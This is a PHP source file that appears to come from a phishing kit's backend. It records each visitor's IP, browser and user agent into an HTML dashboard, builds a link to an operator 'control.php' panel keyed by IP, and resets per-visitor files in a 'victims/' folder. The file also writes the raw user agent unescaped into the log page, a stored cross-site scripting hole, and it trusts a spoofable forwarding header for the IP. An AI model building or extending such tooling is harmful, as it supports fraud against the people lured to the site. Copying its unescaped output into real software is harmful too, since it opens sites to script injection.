<?php

if (session_status() == PHP_SESSION_NONE) {
    session_start();
}
//error_reporting(0);
include("system/index.php");
require_once 'detect.php';

/**
 * Get real client IP address, even when behind a reverse proxy (e.g., Render)
 * 
 * On Render, the app runs behind a load balancer/proxy, so $_SERVER['REMOTE_ADDR']
 * returns 127.0.0.1. This function extracts the real IP from the X-Forwarded-For header.
 * 
 * @return string Real client IP address
 */
function get_client_ip() {
    $ip = $_SERVER['REMOTE_ADDR'];
    
    // Check for X-Forwarded-For header (set by Render and most proxies)
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR']) && !empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        // X-Forwarded-For can contain multiple IPs: client, proxy1, proxy2, ...
        // The leftmost IP is the original client IP
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $first_ip = trim($ips[0]);
        
        if (filter_var($first_ip, FILTER_VALIDATE_IP)) {
            $ip = $first_ip;
        }
    }
    // Fallback to HTTP_CLIENT_IP (rarely used, but kept for compatibility)
    elseif (isset($_SERVER['HTTP_CLIENT_IP']) && filter_var($_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP)) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }
    
    // Normalize IPv6 localhost to IPv4
    if ($ip == '::1') {
        return '127.0.0.1';
    }
    
    return $ip;
}

function visitors() {
    $detect         = new BrowserDetection();
    $ip             = get_client_ip();  // Use real IP instead of REMOTE_ADDR
    $date           = date("Y-m-d H:i:s", time());
    $usragent       = $_SERVER['HTTP_USER_AGENT'];
    $browserName    = $detect->getName();
    $browserVer     = $detect->getVersion();
    $isMobile       = ($detect->isMobile()) ? 'Mobile' : 'Desktop';
    $platformName   = $detect->getPlatform();
    
    $str = "
        <div class='visitor-item'>
            <div class='visitor-header'>
                <strong>🌐 $ip</strong>
                <span class='device $isMobile'>📱 $isMobile</span>
            </div>
            <div class='visitor-info'>
                <span class='time'>🕒 $date</span>
                <span class='browser'>🌐 $browserName $browserVer</span>
                <span class='platform'>💻 $platformName</span>
                <span class='user-agent'>🔍 " . substr($usragent, 0, 50) . "...</span>
            </div>
        </div>";
    
    if (!file_exists('visitors.html')) {
        createVisitorsFile($str);
    } else {
        file_put_contents('visitors.html', $str, FILE_APPEND | LOCK_EX);
    }
}

function createVisitorsFile($firstEntry) {
    $html = '<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Visitors Log</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f5f5f5;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .header {
            background: #2c3e50;
            color: white;
            padding: 20px;
            border-radius: 10px 10px 0 0;
        }
        .header h1 {
            margin: 0;
            font-size: 24px;
        }
        .stats {
            background: #34495e;
            color: white;
            padding: 15px 20px;
            display: flex;
            justify-content: space-between;
        }
        .visitors-list {
            padding: 20px;
        }
        .visitor-item {
            border: 1px solid #ddd;
            border-radius: 8px;
            margin-bottom: 15px;
            background: white;
        }
        .visitor-header {
            background: #3498db;
            color: white;
            padding: 12px 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .device {
            background: #e74c3c;
            padding: 4px 12px;
            border-radius: 15px;
            font-size: 12px;
        }
        .device.Desktop {
            background: #27ae60;
        }
        .visitor-info {
            padding: 12px 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 15px;
        }
        .visitor-info span {
            font-size: 13px;
            color: #555;
        }
        .time {
            color: #e74c3c;
            font-weight: bold;
        }
        .browser {
            color: #3498db;
        }
        .platform {
            color: #9b59b6;
        }
        .user-agent {
            color: #7f8c8d;
            font-size: 12px !important;
            max-width: 200px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }
        @media (max-width: 768px) {
            .visitor-info {
                flex-direction: column;
                align-items: flex-start;
                gap: 5px;
            }
            .visitor-info span {
                font-size: 12px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🌐 Visitors Dashboard</h1>
        </div>
        <div class="stats">
            <div>Total Visitors: <span id="count">0</span></div>
            <div>Last Update: <span id="update">' . date("Y-m-d H:i:s") . '</span></div>
        </div>
        <div class="visitors-list" id="list">' . $firstEntry . '
        </div>
    </div>
    <script>
        function updateCount() {
            var items = document.querySelectorAll(".visitor-item");
            document.getElementById("count").textContent = items.length;
            document.getElementById("update").textContent = new Date().toLocaleString();
        }
        updateCount();
    </script>
</body>
</html>';
    
    file_put_contents('visitors.html', $html);
}

function get_steps_link() {
    $url = "http://". $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    $x = pathinfo($url);
    return $ee = $x['dirname'] . '/control.php?ip=' . get_client_ip();
}

function reset_data() {
    $fp = fopen('victims/'. get_client_ip() .'.txt', 'wb');
    fwrite($fp, 0);
    fclose($fp);
}

?>